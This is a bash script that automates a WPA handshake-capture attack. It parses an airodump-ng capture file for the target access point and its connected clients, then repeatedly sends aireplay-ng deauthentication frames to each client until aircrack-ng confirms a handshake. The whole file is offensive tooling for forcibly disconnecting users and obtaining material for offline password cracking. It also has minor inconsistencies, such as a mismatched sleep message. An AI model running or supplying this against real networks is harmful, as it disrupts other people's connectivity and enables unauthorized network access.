#!/bin/bash
#Need to get the BSSID Name
echo '[?] BSSID Name? (Case Sensitive): '
read BSSIDNAME
BSSID=$(cat "$1" | awk -F',' 'NR>2{print $1}' | sed -e '/Station MAC/d' -e '/BSSID/d' -e '/\n/d' | sed -n 1p)

SUCCESS=$(aircrack-ng "${BSSIDNAME}"-01.cap -w fakewordlist | grep -e "WPA \([1-9] handshake\)" )


until [ -n "$SUCCESS" ]; do
STATIONLIST=$(cat "$1" | awk -F',' 'NR>5{print $1}' | sed -e '/Station MAC/d' -e '/BSSID/d' | sed -e '/^.$/d')
  
  if [ -n "$STATIONLIST" ]; then 
  	echo -e "[+] \e[31mStations connected to $BSSID\e[0m"
	echo -e "[+] \e[31mhammering $BSSID\e[0m"
  	for STATION in $(cat "$1" | awk -F',' 'NR>5{print $1}' | sed -e '/Station MAC/d' -e '/BSSID/d' | sed -e '/^.$/d'); do
	  	aireplay-ng --deauth 7 -a $BSSID -c $STATION wlan1mon
	  	sleep 1m
  	done 
  else 
  	echo "[!] No Stations connected to $BSSID yet. sleeping for 30s"
  	sleep 10s
  fi
  
SUCCESS=$(aircrack-ng "${BSSIDNAME}"-01.cap -w fakewordlist | grep -e "WPA ([1-9] handshake)" )
done

echo -e "[+] \e[31m4way handshake captured!\e[25m\e[0m"
